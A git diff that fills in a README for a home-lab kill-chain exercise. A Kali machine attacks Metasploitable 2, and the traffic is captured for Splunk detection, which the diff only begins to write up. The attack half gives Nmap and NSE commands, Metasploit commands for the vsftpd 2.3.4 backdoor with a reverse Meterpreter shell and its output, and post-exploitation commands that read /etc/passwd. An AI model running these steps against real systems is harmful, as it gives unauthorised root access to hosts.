@@ -10,7 +10,7 @@
 
 ## 📋 Overview
 
-[This repository documents ]
+This repository documents a full adversary kill chain executed in an isolated lab environment. Using Kali Linux as the attacker and Metasploitable 2 as the target, the attack was carried out from initial reconnaissance through exploitation and post-exploitation while TCPDump captured all network traffic. The role then shifted to Blue Team — the capture was ingested into Splunk and SPL queries were used to detect every stage of the attack. This lab demonstrates both offensive execution and defensive detection in a single workflow. 
 
 ---
 
@@ -30,9 +30,11 @@
 
 ## 🛠️ Tools Used
 
-- **Nmap** — Used for both standard scanning and running NSE (Nmap Scripting Engine) scripts to detect and, in one case, actively exploit vulnerabilities
-- **NSE (Nmap Scripting Engine)** — Ran default (`-sC`), targeted (`ftp-anon`, `smb-vuln*`), and broad (`vuln`) script categories against the target
-- **NVD (National Vulnerability Database)** — Referenced to research CVE details, CVSS scores, and attack vectors for confirmed vulnerabilities
+- **Nmap** — Service version detection and NSE vulnerability scanning
+- **NSE (Nmap Scripting Engine)** — `ftp-vsftpd-backdoor` script used to confirm live exploitation before launching Metasploit
+- **Metasploit Framework** — Exploited the vsftpd 2.3.4 backdoor via `exploit/unix/ftp/vsftpd_234_backdoor` to obtain a root Meterpreter session
+- **TCPDump** — Captured all network traffic during the attack for later Blue Team analysis
+- **Splunk SIEM** — Ingested the packet capture and ran SPL detection queries to identify each attack stage
 
 ---
 
@@ -44,67 +46,96 @@
 
 ### RED TEAM (ATTACK)
 ### 1. [Recon: NMAP Scan to discover services]
-For this task 
 
-# Command used
-[]
+For this task, a full TCP connect scan with service version detection was run against the target to identify all open ports and running services before any exploitation was attempted.
+
+# Commands used
+sudo nmap -sT -Pn --disable-arp-ping -n -sV 192.168.79.130 -oN ~/killchain_nmap.txt
 
 
 # Output
 
+Nmap returned multiple open services including FTP (21/vsftpd 2.3.4), SSH (22), Telnet (23), HTTP (80), and others. vsftpd 2.3.4 on port 21 was flagged as the primary target — this version is publicly known to contain an intentional backdoor.
 
 **Findings:**
-1
+
+vsftpd 2.3.4 identified on port 21. This version is listed in the NVD as CVE-2011-2523 with a CVSS score of 9.8 (Critical) and is known to be directly exploitable for root access.
 
 ### 2. [Scanning: using NSE scripts to find vulnerabilities]
-[]
+
+Before launching Metasploit, the Nmap `ftp-vsftpd-backdoor` script was used to actively verify that the backdoor was present and exploitable on the target.
 
 # Command used
-[]
+
+sudo nmap -sV --script=ftp-vsftpd-backdoor -Pn --disable-arp-ping -n -p 21 192.168.79.130
 
 
 # Output
 
-
+The script returned `VULNERABLE (Exploitable)` — confirming the backdoor is live. The vsftpd 2.3.4 backdoor is triggered by appending `:)` to the FTP username during login, which causes the server to open a root shell on port 6200.
 
 **Findings:**
-0
+
+Live exploitability confirmed prior to Metasploit. CVE-2011-2523, CVSS 9.8. This is an unusual NSE result — most vulnerability scripts only detect and report (true/false), but `ftp-vsftpd-backdoor` actively attempts exploitation and returns the shell output, making it one of the few NSE scripts that crosses from detection into exploitation.
+
 ### 3. [Exploitation: using Metasploit to gain access.]
-[] 
+With the vulnerability confirmed, the Metasploit Framework was used to exploit the backdoor and open a Meterpreter session on the target. 
 
 
-# Command used
-[]
+# Meterpreter Commands used
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.79.130
+set LHOST 192.168.79.129
+run
 # Output
 
-2
+[] Started reverse TCP handler on 192.168.79.129:4444
+[+] 192.168.79.130:21 - Backdoor service has been spawned!
+[] Meterpreter session 1 opened (192.168.79.129:4444 → 192.168.79.130:46275)
+
 ```
 
 **Findings:**
 
-
-
+Root-level Meterpreter session opened with no credentials and no privilege escalation required. The backdoor spawns directly as uid=0 (root). The reverse shell callback connected from Metasploitable to Kali on port 4444.
 
 
 ### 4. [Post Exploitation: enumerate users and sensitive files.]
 
+With root access confirmed, post-exploitation commands were run inside a native OS shell on the target to enumerate the system and demonstrate the level of access an attacker would have.
 
-#Command
-[]
+#Commands used
+
+shell
+whoami
+id
+uname -a
+cat /etc/passwd
+ls /home
+
 
 # Output
 .
 
 
 
-**Findings:** 
+**Findings:**
+
+Full root access confirmed. An attacker with this level of access could read, modify, or exfiltrate any file on the system, create persistence, pivot to other hosts, or destroy evidence. The `/etc/passwd` file exposure reveals all local user accounts and their login shells.
+
+
 
 ### BLUE TEAM (DETECT)
 ### 1. Review TCPDUMP capture of all attack activity.
-For this task 
+
+For this task TCPDump was running in a separate terminal throughout the entire attack, capturing all network traffic to a `.pcap` file. After the attack completed, the capture was converted to text for Splunk ingestion.
 
 # Command used
-[]
+
+Capture (ran during attack) > sudo tcpdump -i eth0 -w ~/full_killchain.pcap
+
+Convert to text after attack > tcpdump -r ~/full_killchain.pcap -nn -tttt > ~/killchain_capture.txt
 
 
 # Output
